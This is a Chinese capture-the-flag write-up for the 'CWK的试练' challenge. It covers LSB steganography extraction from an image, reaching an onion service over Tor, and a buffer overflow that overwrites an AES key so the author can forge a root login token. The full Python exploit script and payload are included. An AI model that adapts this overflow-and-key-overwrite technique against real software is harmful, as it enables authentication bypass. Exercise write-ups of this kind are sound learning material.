### CWK的试练

通过PIL库可以将trial.webp无损转为png格式（或者其它格式，但jpg不行）：  

	from PIL import Image
	trial = Image.open("trial.webp")
	trial.save("trial.png")

之后使用Stegsolve.jar可以看到绿色最低位隐藏了一个洋葱地址，以及岛上有规律的花纹和贴心地准备的挺粗的一个黑边，应该是在岛的范围内隐藏了什么东西；用SAI魔棒（PS魔棒也行）将岛域剪出来存为trial2.png，但是还是有淡淡的灰边；注意到边界的颜色都是灰色系，RGB中R和B的值相等，于是提取代码可以这样写：  

	from PIL import Image
	t = Image.open("trial2.png")
	white = (255,255,255)
	data = ''
	
	bit = 0
	byte = 0
	for j in range(629):
	    for i in range(642):
	        pixel = t.getpixel((i, j))
	        if(pixel != white and pixel[0]^pixel[2] != 0):
	            byte *= 2
	            byte += pixel[1]&1
	            bit += 1
	            if(bit == 8):
	                data += chr(a)
	                byte = 0
	                bit = 0
	open("trialdata", 'wb').write(data)

运行后可以得到一个base64编码后的可执行文件。  

然后是洋葱地址的问题，做题时个人只装了Tor浏览器，并没有通过Tor直接连接端口的经验；并且直接通过浏览器访问时好像正常返回了一个页面，着实困惑了一段时间，尝试将可执行文件的CRC32作为参数，目录等都试过了23333~直到看到提示才反应过来去查询通过Tor浏览器代理进行nc的资料，得知开着Tor浏览器会在127.0.0.1:9150开一个socks5的Tor网络代理，最后第一个flag的获取脚本为：  

	import socks, socket
	welcome_msg = """Welcome, cyber warriors, to the lost temple of FLXG!
	For your own safety, you need to show me the blueprint of this trial. You won't pass the trial safely without it.
	To be precise, we just need the CRC32 of the blueprint, in UPPERCASE format.\n"""
	socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9150)
	tor_sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
	tor_sock.connect(('ustcctfbase7l74q.onion', 2333))
	tor_sock.send('3D6540C7\n')
	while(len(recved) < len(welcome_msg)):
    	recved += tor_sock.recv(2048)
	print recved

之后可以看到  

	Welcome, cyber warriors, to the lost temple of FLXG!
	For your own safety, you need to show me the blueprint of this trial. You won't pass the trial safely without it.
	To be precise, we just need the CRC32 of the blueprint, in UPPERCASE format.
	Great! As a reward, take this magic spell with you.
	Although it is not that powerful, I hope it will help you somehow.
	flxg{But_the_Sun_Also_Rises}
	Now, go ahead for the trial. CWK is waiting for you.
	
	You have two choices:
	0. Register
	1. Start Trial
	
输出了第一个flag后进入了可执行文件的逻辑。  

分析可执行文件可以发现它先是随机生成了16字节的key，之后选择Register或Start Trial；  

Register函数会让用户输入一个限制在16个字符内的用户名username，再随机产生一个iv，将(iv+\x00username)共0x20个字节用一个对称的异或散射函数编码后再使用key和iv用aes_cbc加密对(\x00username...0x10个字节)+(编码后0x20个字节) 一共0x30个字节进行加密，之后前面附上iv输出0x40个字节；在其中判断了username不能是root，并隐藏了一些username是root时会将username前一个字节赋值为0xAA的逻辑。  

Start Trial函数会接收大写16进制的输入并转换为二进制字节数据存储，可以发现这里的输入并没有限制长度，导致可以溢出覆盖在输入地址之后的变量，甚至可以覆盖到key；  
之后将输入的前0x10个字节作为iv，并用key和iv对输入数据后0x30个字节解密，并用异或散射函数验证解密后的结果，然后判断username的内一段是不是'\xAAroot\x00....\xAA'，是的话就会输出flag；

于是随便选一个aeskey和aesiv，构造一个aesiv+aes_cbc('\xAAroot\x00....\xAA'+异或映射函数(aesiv+'\xAAroot\x00....\xAA'))，之后再添上padding和aeskey发过去就行了；

简单看了一下异或散射函数，然后还是选择了patch源程序让它直接输出函数对有效数据的结果来产生payload, 目录下有patch过的程序`trial_patched`，可以直接注册root并输出`aes_key`为`the_rand_aes_key`，iv为`some_rand_aes_iv`的有效的payload。  

	#coding: utf-8
	
	import socks, socket
	from Crypto.Cipher import AES
	def aes_encrypt(data, key, iv):
	    cryptor = AES.new(key, AES.MODE_CBC, iv)
	    return cryptor.encrypt(data)
	def aes_decrypt(data, key, iv):
	    cryptor = AES.new(key, AES.MODE_CBC, iv)
	    return cryptor.decrypt(data)
	
	aes_iv = 'some_rand_aes_iv'
	aes_key = 'the_rand_aes_key'
	valid_data = aes_iv+'\xAAroot\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xAA'
	#405100: input; 4051C0: aes_ctx; 4051F8: ELF64 Section Header;
	payload = '736F6D655F72616E645F6165735F697694700B62136861C49907F0C9319FC3EBE83336532C56A1CC0887A9E7EAE8DCBA8CA2E468495C91F2618D9F83F6E1FDC1'.decode('hex')#aes_iv+aes_encrypt(valid_data+some_enc(valid_data), aes_key, aes_iv)
	payload += (0x405238-0x405100-len(payload))*'\x00'
    # 这里选择了原样覆盖ELF64 Section Header
	payload += '\x0b\x00\x00\x00\x01\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xa8\x02\x40\x00\x00\x00\x00\x00\xa8\x02\x00\x00\x00\x00\x00\x00\x1c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	payload += '\x13\x00\x00\x00\x07\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xc4\x02\x40\x00\x00\x00\x00\x00\xc4\x02\x00\x00\x00\x00\x00\x00\x20\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x04\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
	payload += '\x21\x00\x00\x00\x07\x00\x00\x00' + aes_key
	payload = payload.encode('hex').upper() + '\n'
	# print payload
	# exit()
	server_addr = 'ustcctfbase7l74q.onion 2333'
	welcome_msg = '''Welcome, cyber warriors, to the lost temple of FLXG!
	For your own safety, you need to show me the blueprint of this trial. You won't pass the trial safely without it.
	To be precise, we just need the CRC32 of the blueprint, in UPPERCASE format.\n'''
	second_msg = '''Great! As a reward, take this magic spell with you.
	Although it is not that powerful, I hope it will help you somehow.
	flxg{But_the_Sun_Also_Rises}
	Now, go ahead for the trial. CWK is waiting for you.
	
	You have two choices:
	0. Register
	1. Start Trial
	Now, show me your power.
	flxg{'''
	socks.set_default_proxy(socks.SOCKS5, "127.0.0.1", 9150)
	tor_sock = socks.socksocket(socket.AF_INET, socket.SOCK_STREAM)
	tor_sock.connect(('ustcctfbase7l74q.onion', 2333))
	tor_sock.send('3D6540C7\n')
	tor_sock.send('1\n'+payload+'\n')
	recved = ''
	while(len(recved) <= len(welcome_msg+second_msg)):
	    recved += tor_sock.recv(2048)
	print recved
	tor_sock.close()

期间有个插曲，一开始我用的WSL系统版本有点旧，glibc版本不符无法调试运行这个程序，尝试给WSL更新了一波glibc。。。

后来看到原来是非预期解，而且做出来的2个都是这样的思路2333~

[返回](../)